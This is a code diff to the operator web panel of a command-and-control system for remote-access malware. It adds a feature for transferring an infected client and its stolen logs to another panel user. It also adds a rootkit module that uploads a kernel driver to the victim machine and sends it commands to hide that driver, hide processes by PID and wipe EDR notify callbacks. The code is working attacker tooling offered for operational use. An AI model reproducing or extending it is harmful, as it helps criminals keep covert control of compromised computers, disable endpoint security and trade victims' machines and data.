@@ -538,6 +538,10 @@
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
                     Power
                 </button>
+                <button class="module-nav-item" data-module="rootkit">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M4.93 4.93a10 10 0 0 0 0 14.14"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
+                    Rootkit
+                </button>
             </nav>
 
             <div class="module-sidebar-footer">
@@ -955,7 +959,86 @@ C:\&gt;</div>
                         </button>
                     </div>
                 </div>
+
+                <!-- Transfer Client -->
+                <div class="panel-card" style="margin-top:14px;">
+                    <h3 style="margin:0 0 14px;">Transfer Client</h3>
+                    <p style="font-size:12px;color:var(--text-muted);margin:0 0 14px;">Передать клиента другому пользователю панели.</p>
+                    <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;">
+                        <div style="flex:1;min-width:160px;">
+                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">Username</label>
+                            <input type="text" id="transfer-username" placeholder="target username"
+                                style="width:100%;padding:7px 10px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;box-sizing:border-box;">
+                        </div>
+                        <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text-secondary);white-space:nowrap;padding-bottom:2px;">
+                            <input type="checkbox" id="transfer-logs"> Transfer logs too
+                        </label>
+                        <button class="btn btn-outline" id="btn-transfer" style="white-space:nowrap;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:5px;"><polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>
+                            Transfer
+                        </button>
+                    </div>
+                    <div id="transfer-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
+                </div>
             </div>
+
+            <!-- Rootkit -->
+            <div class="module-panel" id="mod-rootkit">
+                <header class="header">
+                    <h2>Rootkit</h2>
+                    <p class="subtitle">Ring-0 driver — process hiding, driver self-hide, EDR callback wipe</p>
+                </header>
+
+                <!-- Status + Load -->
+                <div class="panel-card" style="margin-bottom:14px;">
+                    <div style="display:flex;align-items:center;gap:14px;margin-bottom:18px;">
+                        <span style="font-size:13px;color:var(--text-secondary);">Driver status:</span>
+                        <span id="rk-status-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;background:rgba(217,95,95,0.15);color:#d95f5f;">Not loaded</span>
+                        <button class="btn btn-outline" id="btn-rk-status" style="margin-left:auto;font-size:12px;padding:5px 12px;">Refresh</button>
+                    </div>
+                    <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;">
+                        <div style="flex:1;min-width:200px;">
+                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">rootkit.sys (compiled .sys binary)</label>
+                            <input type="file" id="rk-sys-file" accept=".sys" style="font-size:12px;color:var(--text-secondary);width:100%;">
+                        </div>
+                        <button class="btn btn-primary" id="btn-rk-load" style="white-space:nowrap;">Load Driver</button>
+                        <button class="btn btn-outline" id="btn-rk-unload" style="white-space:nowrap;border-color:rgba(217,95,95,0.3);color:#d95f5f;">Unload</button>
+                    </div>
+                    <div id="rk-load-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
+                </div>
+
+                <!-- Actions -->
+                <div class="panel-card" style="margin-bottom:14px;">
+                    <h3 style="margin:0 0 14px;font-size:14px;">Actions</h3>
+                    <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                        <button class="btn btn-outline" id="btn-rk-hide-driver" style="font-size:13px;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:5px;"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                            Hide Driver
+                        </button>
+                        <button class="btn btn-outline" id="btn-rk-wipe-edr" style="font-size:13px;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:5px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                            Wipe EDR Callbacks
+                        </button>
+                    </div>
+                    <div id="rk-action-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
+                </div>
+
+                <!-- Process Hide -->
+                <div class="panel-card">
+                    <h3 style="margin:0 0 14px;font-size:14px;">Process Visibility</h3>
+                    <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;">
+                        <div>
+                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">PID</label>
+                            <input type="number" id="rk-pid-input" placeholder="e.g. 4124" style="width:120px;padding:7px 10px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;">
+                        </div>
+                        <button class="btn btn-outline" id="btn-rk-hide-proc" style="font-size:13px;">Hide Process</button>
+                        <button class="btn btn-outline" id="btn-rk-unhide-proc" style="font-size:13px;">Unhide Process</button>
+                    </div>
+                    <div id="rk-proc-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
+                </div>
+            </div>
+
+        </div>
         </div>
     </div>
 
@@ -1124,6 +1207,50 @@ C:\&gt;</div>
                     });
                 } catch {}
             }, 'Uninstall');
+        });
+
+        // Transfer Client
+        document.getElementById('btn-transfer').addEventListener('click', () => {
+            const targetUsername = document.getElementById('transfer-username').value.trim();
+            const transferLogs  = document.getElementById('transfer-logs').checked;
+            const result        = document.getElementById('transfer-result');
+
+            if (!targetUsername) {
+                result.innerHTML = '<span style="color:#d95f5f;">Enter a username.</span>';
+                return;
+            }
+
+            confirmDialog(
+                `Transfer this client to <b>${escapeHtml(targetUsername)}</b>?` +
+                (transferLogs ? '<br><small style="color:var(--text-muted);">Logs will also be transferred.</small>' : ''),
+                async () => {
+                    const btn = document.getElementById('btn-transfer');
+                    btn.disabled = true;
+                    result.innerHTML = '<span style="color:var(--text-muted);">Transferring...</span>';
+                    try {
+                        const r = await fetch(`/api/c2/clients/${encodeURIComponent(clientId)}/transfer`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ target_username: targetUsername, transfer_logs: transferLogs })
+                        });
+                        const d = await r.json();
+                        if (d.success) {
+                            result.innerHTML = `<span style="color:#5fba74;">Transferred to ${escapeHtml(targetUsername)}. You no longer own this client.</span>`;
+                            document.getElementById('transfer-username').value = '';
+                            // redirect back to main page after short delay — client no longer belongs to us
+                            setTimeout(() => { window.location.href = '/'; }, 2500);
+                        } else {
+                            result.innerHTML = `<span style="color:#d95f5f;">${escapeHtml(d.error || 'Transfer failed.')}</span>`;
+                            btn.disabled = false;
+                        }
+                    } catch (err) {
+                        result.innerHTML = `<span style="color:#d95f5f;">Error: ${escapeHtml(err.message)}</span>`;
+                        btn.disabled = false;
+                    }
+                },
+                'Transfer',
+                false
+            );
         });
 
         // Power buttons
@@ -1304,7 +1431,120 @@ C:\&gt;</div>
             }
         });
 
-        // Remote Desktop controls
+        // ── Rootkit ───────────────────────────────────────────────────────────
+
+        function rkCmd(cmd) {
+            return fetch('/api/c2/command', {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ client_id: clientId, command: cmd })
+            });
+        }
+
+        async function rkRefreshStatus() {
+            const badge = document.getElementById('rk-status-badge');
+            try {
+                await rkCmd('rootkit_status');
+                // poll result via generic result endpoint
+                let attempts = 0;
+                const iv = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(iv); return; }
+                    try {
+                        const r = await fetch('/api/c2/rootkit/result/' + encodeURIComponent(clientId));
+                        const d = await r.json();
+                        if (d && d.loaded !== undefined) {
+                            clearInterval(iv);
+                            badge.textContent = d.loaded ? 'Loaded' : 'Not loaded';
+                            badge.style.background = d.loaded ? 'rgba(95,186,116,0.15)' : 'rgba(217,95,95,0.15)';
+                            badge.style.color = d.loaded ? '#5fba74' : '#d95f5f';
+                        }
+                    } catch {}
+                }, 400);
+            } catch {}
+        }
+
+        document.getElementById('btn-rk-status').addEventListener('click', rkRefreshStatus);
+
+        document.getElementById('btn-rk-load').addEventListener('click', async () => {
+            const fileInput = document.getElementById('rk-sys-file');
+            const result = document.getElementById('rk-load-result');
+            const btn = document.getElementById('btn-rk-load');
+            if (!fileInput.files || !fileInput.files[0]) {
+                result.innerHTML = '<span style="color:#d95f5f;">Select a .sys file first.</span>';
+                return;
+            }
+            btn.disabled = true;
+            result.innerHTML = '<span style="color:var(--text-muted);">Uploading...</span>';
+            try {
+                const buf = await fileInput.files[0].arrayBuffer();
+                const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
+                await rkCmd('rootkit_load:' + b64);
+                result.innerHTML = '<span style="color:var(--text-muted);">Sent — waiting for response...</span>';
+                let attempts = 0;
+                const iv = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) { clearInterval(iv); btn.disabled = false; result.innerHTML = '<span style="color:var(--text-muted);">Timeout.</span>'; return; }
+                    try {
+                        const r = await fetch('/api/c2/rootkit/result/' + encodeURIComponent(clientId));
+                        const d = await r.json();
+                        if (d && d.loaded !== undefined) {
+                            clearInterval(iv);
+                            btn.disabled = false;
+                            if (d.loaded) {
+                                result.innerHTML = '<span style="color:#5fba74;">Driver loaded successfully.</span>';
+                                rkRefreshStatus();
+                            } else {
+                                result.innerHTML = '<span style="color:#d95f5f;">Load failed: ' + escapeHtml(d.error || 'unknown') + '</span>';
+                            }
+                        }
+                    } catch {}
+                }, 500);
+            } catch (err) {
+                btn.disabled = false;
+                result.innerHTML = '<span style="color:#d95f5f;">Error: ' + escapeHtml(err.message) + '</span>';
+            }
+        });
+
+        document.getElementById('btn-rk-unload').addEventListener('click', async () => {
+            const result = document.getElementById('rk-load-result');
+            await rkCmd('rootkit_unload');
+            result.innerHTML = '<span style="color:var(--text-muted);">Unload sent.</span>';
+            setTimeout(rkRefreshStatus, 1500);
+        });
+
+        document.getElementById('btn-rk-hide-driver').addEventListener('click', async () => {
+            const res = document.getElementById('rk-action-result');
+            res.innerHTML = '<span style="color:var(--text-muted);">Sending...</span>';
+            await rkCmd('rootkit_hide_driver');
+            res.innerHTML = '<span style="color:#5fba74;">Hide driver command sent.</span>';
+        });
+
+        document.getElementById('btn-rk-wipe-edr').addEventListener('click', () => {
+            confirmDialog('Wipe all EDR process/thread/image notify callbacks? This may destabilize the system.', async () => {
+                const res = document.getElementById('rk-action-result');
+                res.innerHTML = '<span style="color:var(--text-muted);">Sending...</span>';
+                await rkCmd('rootkit_wipe_edr');
+                res.innerHTML = '<span style="color:#5fba74;">EDR wipe command sent.</span>';
+            }, 'Wipe EDR');
+        });
+
+        document.getElementById('btn-rk-hide-proc').addEventListener('click', async () => {
+            const pid = parseInt(document.getElementById('rk-pid-input').value);
+            const res = document.getElementById('rk-proc-result');
+            if (!pid) { res.innerHTML = '<span style="color:#d95f5f;">Enter a valid PID.</span>'; return; }
+            await rkCmd('rootkit_hide_proc:' + pid);
+            res.innerHTML = '<span style="color:#5fba74;">Hide sent for PID ' + pid + '.</span>';
+        });
+
+        document.getElementById('btn-rk-unhide-proc').addEventListener('click', async () => {
+            const pid = parseInt(document.getElementById('rk-pid-input').value);
+            const res = document.getElementById('rk-proc-result');
+            if (!pid) { res.innerHTML = '<span style="color:#d95f5f;">Enter a valid PID.</span>'; return; }
+            await rkCmd('rootkit_unhide_proc:' + pid);
+            res.innerHTML = '<span style="color:#5fba74;">Unhide sent for PID ' + pid + '.</span>';
+        });
+
+        // ── Remote Desktop controls ───────────────────────────────────────────
         const rdpToggleBtn = document.getElementById('rdp-toggle-btn');
         const rdpModeSelect = document.getElementById('rdp-mode');
         const rdpFpsSlider = document.getElementById('rdp-fps');
